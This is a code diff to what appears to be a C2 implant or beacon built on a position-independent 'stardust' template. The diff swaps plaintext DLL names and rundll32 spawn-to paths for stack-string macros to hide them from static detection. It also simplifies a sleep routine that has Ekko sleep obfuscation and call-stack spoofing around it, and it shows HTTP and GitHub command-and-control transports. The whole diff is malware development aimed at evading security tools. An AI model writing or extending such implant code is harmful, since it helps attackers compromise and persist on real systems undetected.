@@ -14,6 +14,7 @@
 #include <ssh.h>
 #include <ssh_client.h>
 #include <transport_tcp.h>
+#include <stackstr.h>
 
 using namespace stardust;
 using namespace starburst;
@@ -42,37 +43,35 @@ declfn instance::instance(
     RESOLVE_IMPORT( ntdll );
     RESOLVE_IMPORT( kernel32 );
 
-    // load advapi32
-    advapi32.handle = reinterpret_cast<uintptr_t>(
-        kernel32.LoadLibraryA( symbol<const char*>( "advapi32.dll" ) )
-    );
-    if ( advapi32.handle ) {
-        RESOLVE_IMPORT( advapi32 );
+    {
+        STK_ADVAPI32(_n);
+        advapi32.handle = reinterpret_cast<uintptr_t>(
+            kernel32.LoadLibraryA( _n ) );
+        if ( advapi32.handle ) { RESOLVE_IMPORT( advapi32 ); }
     }
 
-    // load bcrypt
-    bcrypt_mod.handle = reinterpret_cast<uintptr_t>(
-        kernel32.LoadLibraryA( symbol<const char*>( "bcrypt.dll" ) )
-    );
-    if ( bcrypt_mod.handle ) {
-        RESOLVE_IMPORT( bcrypt_mod );
+    {
+        STK_BCRYPT(_n);
+        bcrypt_mod.handle = reinterpret_cast<uintptr_t>(
+            kernel32.LoadLibraryA( _n ) );
+        if ( bcrypt_mod.handle ) { RESOLVE_IMPORT( bcrypt_mod ); }
     }
 
 #if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
-    winhttp.handle = reinterpret_cast<uintptr_t>(
-        kernel32.LoadLibraryA( symbol<const char*>( "winhttp.dll" ) )
-    );
-    if ( winhttp.handle ) {
-        RESOLVE_IMPORT( winhttp );
+    {
+        STK_WINHTTP(_n);
+        winhttp.handle = reinterpret_cast<uintptr_t>(
+            kernel32.LoadLibraryA( _n ) );
+        if ( winhttp.handle ) { RESOLVE_IMPORT( winhttp ); }
     }
 #endif
 
 #if defined( GITHUB_TRANSPORT )
-    wininet.handle = reinterpret_cast<uintptr_t>(
-        kernel32.LoadLibraryA( symbol<const char*>( "wininet.dll" ) )
-    );
-    if ( wininet.handle ) {
-        RESOLVE_IMPORT( wininet );
+    {
+        STK_WININET(_n);
+        wininet.handle = reinterpret_cast<uintptr_t>(
+            kernel32.LoadLibraryA( _n ) );
+        if ( wininet.handle ) { RESOLVE_IMPORT( wininet ); }
     }
 #endif
 
@@ -117,13 +116,13 @@ declfn instance::instance(
     crypto.h_sha256 = nullptr;
 
     {
-        auto x64_default = symbol<const char*>( "C:\\Windows\\System32\\rundll32.exe" );
-        auto x86_default = symbol<const char*>( "C:\\Windows\\SysWOW64\\rundll32.exe" );
+        STK_RUNDLL32_X64(_x64);
+        STK_RUNDLL32_X86(_x86);
         uint32_t i = 0;
-        while ( x64_default[i] && i < 259 ) { spawnto.x64[i] = x64_default[i]; i++; }
+        while ( _x64[i] && i < 259 ) { spawnto.x64[i] = _x64[i]; i++; }
         spawnto.x64[i] = '\0';
         i = 0;
-        while ( x86_default[i] && i < 259 ) { spawnto.x86[i] = x86_default[i]; i++; }
+        while ( _x86[i] && i < 259 ) { spawnto.x86[i] = _x86[i]; i++; }
         spawnto.x86[i] = '\0';
         spawnto.x64_args[0] = '\0';
         spawnto.x86_args[0] = '\0';
@@ -368,25 +367,7 @@ auto declfn instance::sleep_with_jitter() -> void {
     evasion_ekko_sleep( *this, sleep_time );
 #else
     evasion_pre_sleep( *this );
-
-    LARGE_INTEGER delay;
-    delay.QuadPart = -static_cast<LONGLONG>( sleep_time ) * 10000LL;
-
-#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
-    if ( evasion.spoof.initialized ) {
-        FUNCTION_CALL fc = {};
-        fc.ptr  = reinterpret_cast<PVOID>( ntdll.NtDelayExecution );
-        fc.ssn  = 0;
-        fc.argc = 2;
-        fc.args[0] = spoof_arg( FALSE );
-        fc.args[1] = spoof_arg( &delay );
-        spoof_call( *this, &fc );
-    } else
-#endif
-    {
-        ntdll.NtDelayExecution( FALSE, &delay );
-    }
-
+    SleepMs( sleep_time );
     evasion_post_sleep( *this );
 #endif
 }
